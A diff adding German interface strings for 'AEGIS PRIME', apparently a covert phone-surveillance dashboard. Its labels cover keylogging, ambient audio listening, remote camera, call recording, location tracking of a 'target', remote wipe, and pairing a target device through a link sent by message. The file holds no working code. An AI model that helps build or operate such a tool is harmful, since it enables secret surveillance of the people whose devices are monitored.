@@ -1,0 +1,133 @@
+{
+  "app": {
+    "title": "AEGIS PRIME",
+    "subtitle": "Kriegsraum Dashboard v3.0",
+    "status": "SYSTEM: ONLINE",
+    "encrypted": "VERSCHLÜSSELT: AES-256",
+    "threat_level": "BEDROHUNGSSTUFE: NIEDRIG",
+    "operator": "OPERATOR",
+    "operator_id": "ID: 88-ALPHA",
+    "no_alerts": "Keine neuen Warnungen"
+  },
+  "sidebar": {
+    "my_subscriptions": "MEINE ABONNEMENTS",
+    "dashboard": "Armaturenbrett",
+    "remote_control": "FERNBEDIENUNG",
+    "surroundings_listening": "Umgebungsabhörung",
+    "remote_camera": "Remote-Kamera",
+    "call_recorder": "Anruferekorder",
+    "live_screenshots": "Live-Screenshots",
+    "live_screen_streaming": "Live-Bildschirmübertragung",
+    "block_apps": "Apps blockieren",
+    "block_websites": "Websites blockieren",
+    "block_wifi": "WLAN blockieren",
+    "ai_tools": "KI-WERKZEUGE",
+    "chatgpt": "ChatGPT",
+    "gemini": "Gemini",
+    "monitoring": "ÜBERWACHUNG",
+    "keywords": "Schlüsselwörter",
+    "spy_panel": "Tiefenüberwachung"
+  },
+  "spy": {
+    "title": "TIEFENÜBERWACHUNG",
+    "subtitle": "Zugriff auf Rohdaten und versteckte Dateien",
+    "tabs": {
+      "keylogger": "TASTENPROTOKOLLIERUNG",
+      "media": "DATEIEN & MEDIEN",
+      "schedule": "ZEITPLÄNE"
+    },
+    "keylogger_status": "Keylogger-Status",
+    "active": "AKTIV (Zugänglichkeit gewährt)",
+    "clear_logs": "PROTOKOLLE LÖSCHEN",
+    "new_rule": "NEUE AUTOMATISCHE AUFNAHMEREGEL",
+    "type": "Erfassungstyp",
+    "interval": "Intervall",
+    "duration": "Dauer (bei Audio)",
+    "activate_schedule": "ZEITPLAN AKTIVIEREN",
+    "active_rules": "Aktive Regeln"
+  },
+  "keywords": {
+    "title": "SCHLÜSSELWORT-WÄCHTER",
+    "subtitle": "Semantische Überwachung von Nachrichten und Eingaben in Echtzeit",
+    "active_monitoring": "AKTIVE ÜBERWACHUNG",
+    "add_trigger": "Neuen Auslöser hinzufügen",
+    "keyword_label": "Schlüsselwort / Phrase",
+    "placeholder": "Bsp: hilf mir, geheimes treffen...",
+    "category": "Kategorie",
+    "severity": "Schweregrad",
+    "activate_trigger": "AUSLÖSER AKTIVIEREN",
+    "latest_detections": "Neueste Erkennungen (Simulation)",
+    "active_triggers": "Aktive Auslöser",
+    "synced": "SYNCHRONISIERT MIT AGENT"
+  },
+  "command": {
+    "title": "Geschützte Vermögenswerte",
+    "no_assets": "KEINE VERMÖGENSWERTE VERBUNDEN",
+    "waiting": "Warten auf Agenten-Telemetrie...",
+    "ai_matrix": "KI-Bedrohungsmatrix",
+    "matrix": {
+      "sentiment": "Stimmungsanalyse",
+      "geo": "Georäumliches Risiko",
+      "chatgpt": "ChatGPT-Integration"
+    },
+    "actions": {
+      "mic": "Mik",
+      "cam": "Kam",
+      "rec": "Aufn",
+      "shot": "Bild",
+      "live": "Live",
+      "lock": "Sperr",
+      "wipe": "Lösch"
+    }
+  },
+  "map": {
+    "target_locked": "ZIEL ERFASST",
+    "device": "GERÄT",
+    "battery": "BATTERIE",
+    "status": "STATUS",
+    "online": "ONLINE",
+    "offline": "OFFLINE",
+    "coords": "KOORD",
+    "overlay": "TAKTISCHE ÜBERLAGERUNG",
+    "friendly": "VERBÜNDETE EINHEITEN",
+    "hostiles": "FEINDE"
+  },
+  "feed": {
+    "title": "ECHTZEIT-AKTIVITÄTS-FEED",
+    "live": "LIVE"
+  },
+  "intel": {
+    "telemetry": "Gerätetelemetrie",
+    "network": "Netzwerk",
+    "persistence": "Persistenz",
+    "critical_alerts": "Kritische Warnungen",
+    "top_websites": "Meistbesuchte Websites (24h)",
+    "top_contacts": "Top-Kontakte",
+    "calls": "anrufe",
+    "acknowledge": "Bestätigen",
+    "locate": "Lokalisieren"
+  },
+  "settings": {
+    "title": "Systemkonfiguration",
+    "language": "Schnittstellensprache",
+    "select_language": "Sprache auswählen",
+    "close": "Schließen",
+    "save": "Änderungen speichern"
+  },
+  "pairing": {
+    "title": "NEUES GERÄT HINZUFÜGEN",
+    "scan_title": "Scannen mit Kamera (HTTPS v2)",
+    "scan_subtitle": "Öffnen Sie Ihre Kamera-App oder einen QR-Reader. Ein sicherer HTTPS-Link wird erkannt.",
+    "scan_with_app": "Scannen mit Aegis App",
+    "scan_instruction": "Öffnen Sie die App auf dem Zielgerät und richten Sie die Kamera auf diesen Code.",
+    "deep_link_label": "DEEP LINK",
+    "deep_link_instruction": "Senden Sie diesen Link per WhatsApp, SMS oder E-Mail an das Zielgerät. Ein Klick koppelt das Gerät automatisch.",
+    "manual_code_label": "MANUELLER CODE",
+    "manual_code_instruction": "Geben Sie diesen 6-stelligen Code manuell im Kopplungsbildschirm der Aegis Mobile App ein.",
+    "nfc_title": "Bereit zum Koppeln via NFC",
+    "nfc_instruction": "Bringen Sie das Zielgerät in die Nähe dieses Terminals (falls unterstützt).",
+    "expires_in": "SITZUNG LÄUFT AB IN:",
+    "id": "ID",
+    "copy_text": "Text kopieren"
+  }
+}
